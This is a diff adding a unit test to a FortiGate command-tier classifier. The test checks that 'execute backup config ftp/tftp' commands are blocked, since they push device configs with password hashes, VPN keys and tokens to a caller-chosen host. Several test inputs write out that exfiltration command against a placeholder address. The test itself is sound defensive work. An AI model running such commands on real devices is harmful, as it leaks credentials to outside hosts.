@@ -383,6 +383,78 @@ static void test_credential_read_variants_fail_closed(void)
     assert(fg_route_command("show system interface physical") == VIRP_TIER_YELLOW); PASS();
 }
 
+/* =========================================================================
+ * Audit §4.3 — `execute backup` must not run unapproved
+ *
+ * `execute backup config ftp <file> <server> <user> <pass>` makes the
+ * DEVICE push its entire config — admin password hashes, VPN PSKs, API
+ * tokens — to a caller-supplied host. The O-Node never sees the bytes,
+ * so nothing about that transfer is observed, signed, or chained. It was
+ * classified YELLOW, which at the shipped gate_max_tier=yellow means it
+ * executed with no approval: untraced egress to an attacker-chosen
+ * destination.
+ *
+ * `gate_tier_blocks()` is static in virp_onode.c and cannot be linked
+ * here, so its rule is mirrored below. The mirror is asserted against
+ * known-good pairs first, so it cannot drift into vacuous agreement.
+ * ========================================================================= */
+
+static bool gate_blocks(virp_trust_tier_t tier, virp_trust_tier_t max_tier)
+{
+    if (tier == VIRP_TIER_UNCLASSIFIED) return true;
+    if (tier == VIRP_TIER_BLACK)        return true;
+    return tier > max_tier;
+}
+
+static void test_execute_backup_is_gated(void)
+{
+    printf("\n=== Audit §4.3 — execute backup is gated at yellow ===\n");
+
+    /* Guard the mirror itself before relying on it. */
+    TEST("mirror sanity: GREEN passes, RED blocks at max=YELLOW");
+    assert(gate_blocks(VIRP_TIER_GREEN,  VIRP_TIER_YELLOW) == false);
+    assert(gate_blocks(VIRP_TIER_YELLOW, VIRP_TIER_YELLOW) == false);
+    assert(gate_blocks(VIRP_TIER_RED,    VIRP_TIER_YELLOW) == true);
+    PASS();
+
+    TEST("execute backup -> RED (not YELLOW)");
+    assert(fg_route_command("execute backup") == VIRP_TIER_RED);
+    assert(fg_route_command("execute backup") != VIRP_TIER_YELLOW);
+    PASS();
+
+    /* The actual exfil form, with a caller-controlled destination. */
+    TEST("execute backup config ftp <file> <host> <user> <pass> -> RED");
+    assert(fg_route_command(
+        "execute backup config ftp cfg.bak 203.0.113.9 evil pass")
+        == VIRP_TIER_RED);
+    PASS();
+
+    TEST("execute backup DOES NOT execute at gate_max_tier=yellow");
+    assert(gate_blocks(fg_route_command("execute backup"),
+                       VIRP_TIER_YELLOW) == true);
+    assert(gate_blocks(fg_route_command(
+        "execute backup config ftp cfg.bak 203.0.113.9 evil pass"),
+        VIRP_TIER_YELLOW) == true);
+    PASS();
+
+    /* Case-insensitivity must not open a bypass. */
+    TEST("EXECUTE BACKUP (case variants) still RED");
+    assert(fg_route_command("EXECUTE BACKUP") == VIRP_TIER_RED);
+    assert(fg_route_command("Execute Backup config tftp x 203.0.113.9")
+           == VIRP_TIER_RED);
+    PASS();
+
+    /*
+     * The in-band config read is deliberately NOT swept up: it returns
+     * the config THROUGH the O-Node, which signs and chains what it saw.
+     * That distinction is the whole point of the tier split, so pin it.
+     */
+    TEST("show full-configuration stays YELLOW (in-band, gets signed)");
+    assert(fg_route_command("show full-configuration") == VIRP_TIER_YELLOW);
+    assert(gate_blocks(VIRP_TIER_YELLOW, VIRP_TIER_YELLOW) == false);
+    PASS();
+}
+
 int main(void)
 {
     printf("VIRP FortiGate Driver — BLACK Tier Enforcement Tests\n");
@@ -396,6 +468,7 @@ int main(void)
     test_no_match_fails_closed();
     test_table_driven_all_entries();
     test_credential_read_variants_fail_closed();
+    test_execute_backup_is_gated();
     printf("\n====================================================\n");
     printf("Results: %d/%d passed\n", tests_passed, tests_run);
 
